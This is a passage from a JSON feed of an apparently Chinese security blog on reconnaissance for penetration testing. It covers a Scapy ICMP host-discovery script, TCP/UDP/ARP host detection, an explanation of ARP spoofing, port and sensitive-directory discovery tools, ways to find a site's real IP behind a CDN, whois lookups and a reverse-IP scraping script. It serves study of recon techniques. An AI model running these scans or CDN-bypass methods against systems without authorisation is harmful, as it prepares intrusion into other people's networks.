builtin\">id</span><span class=\"token operator\">=</span>ip_id<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>ICMP<span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token operator\">=</span>icmp_id<span class=\"token punctuation\">,</span>seq<span class=\"token operator\">=</span>icmp_seq<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token string\">b'rootkit'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    result <span class=\"token operator\">=</span> sr1<span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> verbose<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">for</span> rcv <span class=\"token keyword\">in</span> result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            scan_ip <span class=\"token operator\">=</span> rcv<span class=\"token punctuation\">[</span>IP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>src</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>scan_ip <span class=\"token operator\">+</span> <span class=\"token string\">'--->'</span> <span class=\"token string\">'Host is up'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ip <span class=\"token operator\">+</span> <span class=\"token string\">'--->'</span> <span class=\"token string\">'host is down'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    parser <span class=\"token operator\">=</span> OptionParser<span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:%prog -i &lt;target host> \"</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 输出帮助信息</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-i'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'IP'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'specify target host'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 获取 ip 地址参数</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    options<span class=\"token punctuation\">,</span>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Scan report for \"</span> <span class=\"token operator\">+</span> options<span class=\"token punctuation\">.</span>IP <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\"># 判断是单台主机还是多台主机</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># ip 中存在 -, 说明是要扫描多台主机</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">'-'</span> <span class=\"token keyword\">in</span> options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\"># 代码意思举例：192.168.1.1-120</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\"># 通过 '-' 进行分割，把 192.168.1.1 和 120 进行分离</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\"># 把 192.168.1.1 通过 ',' 进行分割，取最后一个数作为 range 函数的 start, 然后把 120+1 作为 range 函数的 stop</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># 这样循环遍历出需要扫描的 IP 地址</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            Scan<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        Scan<span class=\"token punctuation\">(</span>options<span class=\"token punctuation\">.</span>IP<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nScan finished!....\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"interrupted by user, killing all threads...\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"tcpudp\"><a class=\"anchor\" href=\"#tcpudp\">#</a> TCP&amp;UDP</h2>\n<p>传输层主要负责向两个主机中进程之间的通信提供服务。包括：传输控制协议（TCP）和用户数据报协议（UDP）</p>\n<h3 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h3>\n<ol>\n<li>TCP<br />\n 为两台计算机之间提供面向连接、可靠的字节流服务。一台计算机发出的字节流无差错地发往网络上的其他计算机，由于其可靠的传输方式，故传输速度较慢。</li>\n<li>UDP<br />\n 是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP 在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故传输速度很快。</li>\n</ol>\n<h3 id=\"tcp探测存活主机\"><a class=\"anchor\" href=\"#tcp探测存活主机\">#</a> TCP 探测存活主机</h3>\n<p>tcp 报文</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171754479.png\" alt=\"image-20230317175413383\" /></p>\n<ol>\n<li>URG：表示紧急指针是否有效；</li>\n<li>ACK：表示确认号是否有效，携带 ACK 标志的数据报文段为确认报文段；</li>\n<li>PSH：表示是带有 PUSH 标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满；</li>\n<li>RST：表示出现严重差错。可能需要重现创建 TCP 连接。还可以用于拒绝非法的报文段和拒绝连接请求；</li>\n<li>SYN：表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步；</li>\n<li>FIN：表示发送方没有数据要传输了，要求释放连接；</li>\n</ol>\n<p>利用 TCP 的三次握手原理进行主机存活探测，当向目标主句直接发送 ACK 数据包时，如果目标主机存活就会返回一个 RST 数据包，以终止这个不支持的链接。其工作原理主要以来于目标主句响应数据包的 flags 指端，如果这个 flags 字段有值则表示主机存活，</p>\n<h3 id=\"udp主机存活探测\"><a class=\"anchor\" href=\"#udp主机存活探测\">#</a> UDP 主机存活探测</h3>\n<p>UDP 是一种利用 IP 提供面向无连接的网络通信服务，UDP 会把应用程序发来的数据，在收到的一刻立即原样发送到网络上，即使在网络传输过程中出现丢包、顺序错乱等情况，UDP 也不会负责重新发送以及纠错。</p>\n<h2 id=\"arp\"><a class=\"anchor\" href=\"#arp\">#</a> ARP</h2>\n<h3 id=\"概述-2\"><a class=\"anchor\" href=\"#概述-2\">#</a> 概述</h3>\n<p>地址解析协议 (ARP,Address Resolution Protocol) 根据 IP 地址获取物理地址的一个 TCP/IP 协议。以太网协议规定，同一网段中的一台主机要和另一台主机进行直接通信，必须知道目标主机的 MAC 地址，此时需要 ARP 协议来完成 IP 地址到 MAC 地址的转换。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171811601.png\" alt=\"image-20230317181124564\" /></p>\n<ol>\n<li>PC1 知道 PC3 的 IP 地址为 192.168.1.3，然后 PC1 会检查自己的 APR 缓存表中是否有 PC3 对应的 MAC 地址。</li>\n<li>如果 PC1 有 PC3 MAC 地址，则进行通信。如果没有，PC1 通过广播方式给网络上的每一台主机发送 ARP 请求，询问 192.168.1.3 对应的 MAC 地址。ARP 请求中同时也包含了 PC1 的 IP 地址和 MAC 地址。以太网内的所有主机都会接收到 ARP 请求，并检查是否与自己的 IP 地址匹配。如果不匹配，则丢弃该 ARP 请求。</li>\n<li>PC3 确定 ARP 请求中的 IP 地址与自己的 IP 地址匹配，则将 ARP 请求中 PC1 的 IP 地址和 MAC 地址添加到本地 ARP 缓存中。PC3 将自己的 MAC 地址发送给 PC1。</li>\n<li>PC1 收到 PC3 的 ARP 响应时，将 PC3 的 IP 地址和 MAC 地址都更新到本地 ARP 缓存表中。</li>\n</ol>\n<h3 id=\"arp主机欺骗\"><a class=\"anchor\" href=\"#arp主机欺骗\">#</a> ARP 主机欺骗</h3>\n<p>ARP 欺骗 (ARP spoofing) 又称 ARP 毒化，是针对以太网地址解析协议的一种攻击技术。通过 ARP 欺骗可让攻击者获取局域网上的数据包甚至可篡改数据包，并且可让网络上特定计算机或所有计算机无法正常连线。</p>\n<pre><code>假设一个网络环境中有三台主机，分别为主机A、B、C。详细信息如下描述：\nA的地址为：IP：192.168.10.1 MAC: AA-AA-AA-AA-AA-AA\nB的地址为：IP：192.168.10.2 MAC: BB-BB-BB-BB-BB-BB\nC的地址为：IP：192.168.10.3 MAC: CC-CC-CC-CC-CC-CC\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171814633.png\" alt=\"image-20230317181431599\" /></p>\n<ol>\n<li>B 向 A 发送一个自己伪造的 ARP 应答，而这个应答中的数据发送方的 IP 地址是 192.168.10.3（C 的 IP 地址），MAC 地址是 BB-BB-BB-BB-BB-BB（C 的 MAC 地址本来应该是 CC-CC-CC-CC-CC-CC，这里 C 被伪造了）。</li>\n<li>当 A 接收到 B 伪造的 ARP 应答，会更新本地的 ARP 缓存（A 被欺骗了），这时 B 就伪装成 C 了。</li>\n<li>同时，B 同样向 C 发送一个 ARP 应答，应答包中发送方 IP 地址是 192.168.10.1（A 的 IP 地址），MAC 地址是 BB-BB-BB-BB-BB-BB（A 的 MAC 地址本来应该是 AA-AA-AA-AA-AA-AA）。</li>\n<li>当 C 收到 B 伪造的 ARP 应答，也会更新本地 ARP 缓存（C 也被欺骗了），这时 B 就伪装成了 A。这样主机 A 和 C 都被主机 B 欺骗，A 和 C 之间通讯的数据都经过了 B，主机 B 完全可以知道他们之间传输的任何信息。这就是典型的 ARP 欺骗过程。</li>\n</ol>\n<h3 id=\"arp主机发现的原理\"><a class=\"anchor\" href=\"#arp主机发现的原理\">#</a> ARP 主机发现的原理</h3>\n<p>当目标主机与我们处于同一个以太网的时候，可以利用 ARP 协议进行主机发现，该种扫描方式速度较快、识别精准。我们通过利用 Scapy 进行 ARP 主机发现，若主机存活，则会响应我们的 ARP 请求，否则不会响应。</p>\n<h2 id=\"端口指纹识别\"><a class=\"anchor\" href=\"#端口指纹识别\">#</a> 端口指纹识别</h2>\n<h3 id=\"概述-3\"><a class=\"anchor\" href=\"#概述-3\">#</a> 概述</h3>\n<p>在 Internet 上，各主机间通过 TCP/IP 协议发送和接收数据包，各个数据包根据其目的主机的 ip 地址来进行互联网络中的路由选择，把数据包顺利的传送到目的主机进程分配协议端口。</p>\n<p>简单来说，如果把服务器看作一栋房子，那么端口就是可以进出这栋房子的门。真正的房子只有一个或几个门，服务器至多有 65536 个门。不同的端口（门）可以指向不同的服务（房间）。</p>\n<h3 id=\"常用端口对应的服务\"><a class=\"anchor\" href=\"#常用端口对应的服务\">#</a> 常用端口对应的服务</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171838057.png\" alt=\"image-20230317183857978\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171839596.png\" alt=\"image-20230317183908525\" /></p>\n<h2 id=\"敏感目录探测\"><a class=\"anchor\" href=\"#敏感目录探测\">#</a> 敏感目录探测</h2>\n<h3 id=\"概述-4\"><a class=\"anchor\" href=\"#概述-4\">#</a> 概述</h3>\n<p>敏感目录探测属于信息搜集的一部分，善于发现隐藏的信息。例如：备份文件、数据库、网站路径、后门文件、管理后台登陆界面等，对渗透测试具有事半功倍的作用。</p>\n<p>通常用于进行敏感目录的常见工具有：</p>\n<ol>\n<li>御剑目录爆破工具</li>\n<li>Dirsearch</li>\n<li>DirBrute</li>\n<li>7kbscan-WebPathBrute</li>\n</ol>\n<h4 id=\"response状态码\"><a class=\"anchor\" href=\"#response状态码\">#</a> Response 状态码</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171847429.png\" alt=\"image-20230317184701370\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303171847944.png\" alt=\"image-20230317184725880\" /></p>\n<p>敏感目录探测作用:</p>\n<ol>\n<li>探测网站真实目录；</li>\n<li>探测系统敏感目录；</li>\n<li>探测 web 服务备份文件；</li>\n<li>查询网站右后门文件；</li>\n</ol>\n",
            "tags": [
                "Web",
                "主动信息收集"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2023/03/20/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "被动信息收集",
            "date_published": "2023-03-19T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>在渗透测试的过程中，无论你是在进行 web 渗透还是，内网渗透还是域渗透，收集到关于目标系统更加全面的信息是非常重要的，信息收集贯穿整个渗透测试的生命周期中，通常我们将信息收集分为主动信息收集和被动信息收集</p>\n<p>被动信息收集</p>\n<p>主要是指不与目标主机进行直接交互，通常根据搜索引擎或者社交等方式间接的获取目标服务器的信息。常见的信息收集主要包括：子域名收集，IP 地址查询，域名反查，whois 查询，邮件收集，github 源码泄露等</p>\n<h2 id=\"域名查ip\"><a class=\"anchor\" href=\"#域名查ip\">#</a> 域名查 IP</h2>\n<p>IP 查询是通过当前所获取到的 url 去查询对应 ip 地址的过程</p>\n<ol>\n<li>\n<p>可以应用 Socket 库函数中的 gethostbyname () 函数获域名对应的 ip 值</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>gethostbyname<span class=\"token punctuation\">(</span><span class=\"token string\">'www.baidu.com'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure></li>\n<li>\n<p>也可以直接去 ping 域名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303131342359.png\" alt=\"image-20230313134257301\" /></p>\n</li>\n</ol>\n<p>但是这样拿到的 ip 不一定是真实 ip，可能存在 CDN，我们可以通过这个网站<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuMTdjZS5jb20v\"> http://www.baidu.com GET 测试结果 网站速度测试 17CE</span> 通过全国各地的 ping，看域名是否一致，如果不一致我们就可以认定，这里打开了 CDN，反之一直就可以认定其为真实 ip</p>\n<h3 id=\"绕过cdn查找真实ip\"><a class=\"anchor\" href=\"#绕过cdn查找真实ip\">#</a> 绕过 CDN 查找真实 IP</h3>\n<p>CDN 是 Content Delivery Network 的缩写，翻译成中文是内容分发网络。它是一种通过在全球范围内部署服务器来提高网站访问速度和性能的技术。CDN 的主要目的是通过将网站的静态资源（如图片、视频、CSS、JavaScript 等）缓存到离用户更近的服务器上，从而加快用户访问网站的速度。当用户请求访问网站时，CDN 会自动选择离用户最近的服务器来提供内容，从而减少了网络延迟和带宽使用，提高了网站的访问速度和性能。</p>\n<p>下面几种常见的绕过 CDN 防护寻找真实 ip 的方法:</p>\n<ul>\n<li>目标邮件系统：一般的邮件系统都在内部，没有进行 CDN 解析，通过目标网站的用户注册 / 登录等功能，寻找邮件服务器域名 ip</li>\n<li>扫描敏感文件：如 phpinfo 泄露，github 信息泄露，命令执行等，可在敏感文件中寻找到真实 ip</li>\n<li>国外访问：国内的 CDN 往往只对国内的用户访问加速，因此可通过国外的代理，或者服务器访问，可能会拿到真实 ip</li>\n<li>分站域名：很多服务器主站的访问量会比较大，所以主站挂 dns，但是分站没有 CDN</li>\n<li>利用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20v\"> Access denied (securitytrails.com)</span> 平台，查找历史记录来寻找到真实 ip</li>\n</ul>\n<h3 id=\"验证获取的ip地址\"><a class=\"anchor\" href=\"#验证获取的ip地址\">#</a> 验证获取的 ip 地址</h3>\n<ol>\n<li>找到目标的真实 IP 后，如果是 web 服务，最简单的方式就是直接用 IP 访问，看响应的页面和访问域名的一致</li>\n<li>借助端口扫描工具，扫描对应的 IP 地址，并以 IP 地址加端口的形式进行访问，观察响应结果是否和目标站点一致</li>\n<li>借助第三方工具，查看该 ip 绑定的域名是否相同</li>\n</ol>\n<h2 id=\"whois查询和ip反查\"><a class=\"anchor\" href=\"#whois查询和ip反查\">#</a> whois 查询和 ip 反查</h2>\n<h3 id=\"whois查询\"><a class=\"anchor\" href=\"#whois查询\">#</a> whois 查询</h3>\n<p>whois 查询是用来查询域名的 ip 以及所有者信息的传输协议，简单地说，whois 就是一个数据库，用来查询域名是否已经被注册，以及注册域名的详细信息（如域名所有人，域名注册商等）。python 中的模块 python-whois 可用于 whois 的查询</p>\n<p>安装模块命令：</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pip install python<span class=\"token operator\">-</span>whois</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142100043.png\" alt=\"image-20230314210018924\" /></p>\n<p>使用</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142101019.png\" alt=\"image-20230314210151250\" /></p>\n<h3 id=\"ip反查绑定域名\"><a class=\"anchor\" href=\"#ip反查绑定域名\">#</a> ip 反查绑定域名</h3>\n<p>当访问 ip 地址，查询不到网站目录，此时可以通过查询目标 IP 绑定的 url，通过访问该域名访问目标网站，多网站进行 web 渗透，常使用两个网站<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=\">域名查 iP 域名解析 iP 查询网站 iP 反查域名 iP 反查网站 同一 iP 网站 同 iP 网站域名 iP 查询 (ip138.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8yMjIuMTQwLjIzLjEzMy8=\">222.140.23.133 属于河南省 许昌市 魏都区 联通_IP 反查域名_同 IP 站点查询_同 ip 网站查询_爱站网 (aizhan.com)</span></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303142107615.png\" alt=\"image-20230314210706544\" /></p>\n<p>这里既然是 python 骗，这里贴上一个大佬的 python 脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> bs4 <span class=\"token keyword\">import</span> BeautifulSoup</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> optparse <span class=\"token keyword\">import</span> OptionParser</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    parser <span class=\"token operator\">=</span> OptionParser<span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:%prog -i &lt;target host> \"</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 输出帮助信息</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    parser<span class=\"token punctuation\">.</span>add_option<span class=\"token punctuation\">(</span><span class=\"token string\">'-i'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span>dest<span class=\"token operator\">=</span><span class=\"token string\">'IP'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'specify target host'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 获取 ip 地址参数</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    options<span class=\"token punctuation\">,</span>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Search for \"</span> <span class=\"token operator\">+</span> options<span class=\"token punctuation\">.</span>IP <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>               <span class=\"token string\">'Accept'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'*/*'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>               <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://site.ip138.com/\"</span><span class=\"token operator\">+</span>options<span class=\"token punctuation\">.</span>IP</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    pattern <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;li>&lt;span class=\"date\".*?&lt;/li>'</span><span class=\"token punctuation\">,</span>re<span class=\"token punctuation\">.</span>S<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    content <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        soup <span class=\"token operator\">=</span> BeautifulSoup<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span><span class=\"token string\">'lxml'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        url <span class=\"token operator\">=</span> soup<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">.</span>attrs<span class=\"token punctuation\">[</span><span class=\"token string\">'href'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">except</span> KeyboardInterrupt<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"interrupted by user, killing all threads...\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"web指纹识别\"><a class=\"anchor\" href=\"#web指纹识别\">#</a> web 指纹识别</h2>\n<p>主要是为了探究目标网站的 CMS，通过网上已经公开的快速的进行漏洞验证对目标渗透测试过程中，目标的 cms 是十分重要的信息，有了目标的 cms，就可以利用相关 bug 进行测试，进行代码审计等。</p>\n<p>有很多开源的工具和指纹库，如 